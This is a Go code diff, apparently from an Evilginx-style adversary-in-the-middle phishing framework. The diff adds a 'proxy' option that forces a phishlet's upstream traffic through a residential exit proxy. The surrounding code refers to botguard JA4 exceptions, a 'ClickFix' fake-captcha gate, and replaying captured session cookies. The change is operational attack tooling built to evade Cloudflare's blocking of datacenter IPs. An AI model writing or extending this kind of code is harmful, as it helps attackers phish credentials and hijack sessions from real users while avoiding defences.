@@ -137,6 +137,8 @@ type Phishlet struct {
 	// per-phishlet botguard JA4 exceptions (corporate TLS-inspection
 	// variants) — OR-merged with the node-level -bg-ja4 allowlist
 	bgJA4Allow []string
+	// `proxy: true` — force this phishlet's upstream through the exit proxy
+	forceProxy bool
 }
 
 // bgJA4PrefixRe — a JA4 prefix is lowercase alphanumeric (the FoxIO format),
@@ -257,6 +259,11 @@ type ConfigPhishlet struct {
 	BgJA4Allow  []string            `mapstructure:"bg_ja4_allow"`
 	ReopenUrl   string              `mapstructure:"reopen_url"`
 	ClickFix    *ConfigClickFix     `mapstructure:"clickfix"`
+	// Proxy: force this phishlet's whole upstream through the node's
+	// configured exit proxy (residential), regardless of the global
+	// domain-suffix routes — for Cloudflare-protected origins that reject
+	// datacenter egress IPs.
+	Proxy *bool `mapstructure:"proxy"`
 }
 
 // ClickFix — fake-captcha gate configuration (per-phishlet).
@@ -317,6 +324,7 @@ func (p *Phishlet) Clear() {
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
 	p.bgJA4Allow = []string{}
+	p.forceProxy = false
 }
 
 func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
@@ -594,6 +602,14 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 		if len(p.bgJA4Allow) > 0 {
 			log.Info("phishlet %s: %d botguard JA4 exception(s)", p.Name, len(p.bgJA4Allow))
+		}
+	}
+	// `proxy: true` — force this phishlet's whole upstream through the exit
+	// proxy (bypasses the global suffix-route matching for its origin hosts)
+	if fp.Proxy != nil {
+		p.forceProxy = *fp.Proxy
+		if p.forceProxy {
+			log.Info("phishlet %s: upstream forced through exit proxy", p.Name)
 		}
 	}
 	// URL to open when replaying a captured session with cookies
